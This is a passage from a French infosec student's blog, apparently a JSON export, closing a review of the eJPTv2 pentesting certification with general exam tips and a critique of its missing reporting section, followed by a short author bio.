pendant le parcours.\nAu total, j\u0026rsquo;ai passé 7 heures pour l\u0026rsquo;examen et j\u0026rsquo;ai obtenu la certification avec un score de 91% (le seuil de réussite est de 70%).\nMes conseils sont simples\u0026hellip; Brute forcer moi ces services xD ! Plus sérieusement, l\u0026rsquo;examen se rapproche davantage de la réalité (du moins je le pense, n\u0026rsquo;ayant jamais fait de missions de pentesting). Ce n\u0026rsquo;est pas un CTF. Suivez bien votre méthodologie, prenez le temps de scanner minutieusement votre cible à l\u0026rsquo;aide de scripts Nmap pour obtenir autant d\u0026rsquo;informations que possible. Prenez des notes sur vos résultats, car il y a de nombreux hôtes à exploiter, et vous pourriez vous perdre dans les informations.\nEn ce qui concerne le pivoting, assurez-vous de repérer le point de pivot en consultant les cartes réseau à l\u0026rsquo;aide d\u0026rsquo;une commande comme ifconfig (dans le cas de Meterpreter). Il y aura forcément un point de pivot, ne le manquez pas. Essayez de tirer parti de Metasploit autant que possible, car les questions peuvent souvent tourner autour de Metasploit, ce qui vous aidera à répondre.\nEn termes de post-exploitation, n\u0026rsquo;oubliez pas de mettre en place de la persistance. Cela peut sembler évident, mais cela peut vous faire gagner du temps. J\u0026rsquo;ai personnellement gagné du temps en fermant mon navigateur Firefox qui chargeait un reverse shell. Heureusement, grâce à la persistance, je n\u0026rsquo;ai pas eu à refaire toute l\u0026rsquo;exploitation. Pour l\u0026rsquo;élévation des privilèges sur les hôtes Windows, dans mon cas je n\u0026rsquo;ai pas eu a élévers mes privilges, mais pour le système Linux, j\u0026rsquo;ai du passer par pluseiure phase d\u0026rsquo;élévation. N\u0026rsquo;oubliez pas de réutiliser les mots de passe que vous avez trouvés pour vous connecter en tant qu\u0026rsquo;utilisateur local.\nPour finir, utilisez les questions fournies comme des indices. À un moment donné, j\u0026rsquo;étais bloqué dans ma recherche du point de pivot, mais une question m\u0026rsquo;a orienté vers la vulnérabilité à exploiter, ce qui m\u0026rsquo;a permis de progresser.\nLacune dans la Certification # Une lacune notable dans la certification réside dans l\u0026rsquo;absence d\u0026rsquo;une section consacrée au reporting. Je suis d\u0026rsquo;avis que le pentest ne se limite pas seulement à l\u0026rsquo;exploitation, mais également à la communication des résultats. Un rapport de pentest revêt une importance capitale, car il documente les vulnérabilités découvertes, les méthodes utilisées pour les exploiter, ainsi que les recommandations pour les résoudre. Il constitue une preuve concrète du travail accompli et de la valeur ajoutée en matière de sécurité.\nDans le contexte professionnel, les clients et les employeurs attendent généralement un rapport détaillé exposant clairement les problèmes de sécurité identifiés, ainsi que les mesures correctives suggérées. Un rapport bien structuré facilite la compréhension des enjeux et permet de prendre des décisions éclairées pour renforcer la posture de sécurité.\nL\u0026rsquo;intégration d\u0026rsquo;une section dédiée au reporting dans la certification offrirait aux apprenants l\u0026rsquo;occasion de se familiariser avec la rédaction de rapports de pentest, un aspect fondamental de la profession de pentester dans la vie réelle. Cette inclusion pourrait également renforcer la compréhension de l\u0026rsquo;importance de la communication claire et concise des résultats de sécurité.\nMot de Fin # La préparation à la certification de Ejptv2 exige une approche holistique. Des cours aux CTF en passant par l\u0026rsquo;expérience de l\u0026rsquo;examen, chaque élément contribue à développer des compétences solides en matière de sécurité informatique. Gardez à l\u0026rsquo;esprit que la persévérance, la pratique et la curiosité sont des atouts précieux dans ce parcours.\nBonne chance dans votre préparation et votre réussite à la certification !!\n","date":"11 August 2023","externalUrl":null,"permalink":"/posts/ejpt/","section":"Posts","summary":"eJPTv2 Review FR # cette review est en quatre parties # Les cours et le PATH","title":"Review : eJPTv2 by INE"},{"content":" Whoami # Hello ! Je suis un jeune étudiant en infosec, passionné de pentest Active Directory et Web.\nCe petit blog me servira à poster des reviews de certifications, des writeups et peut-être d\u0026rsquo;autres petites choses.\nActuellement je prépare l\u0026rsquo;OSCP (Offshore soon hehe).\nCertifications : eJPTv2, Dante, Zephyr.\nMy squad Web site : 🥷 TheF0rceAwakens\nCTF platformes :\n💀 ROOTME ☁️ TryHackme 🟩 HackTheBox\n","date":"1 January 0001","externalUrl":null,"permalink":"/about/","section":"Ani blog","summary":"Whoami # Hello !","title":""},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series"}]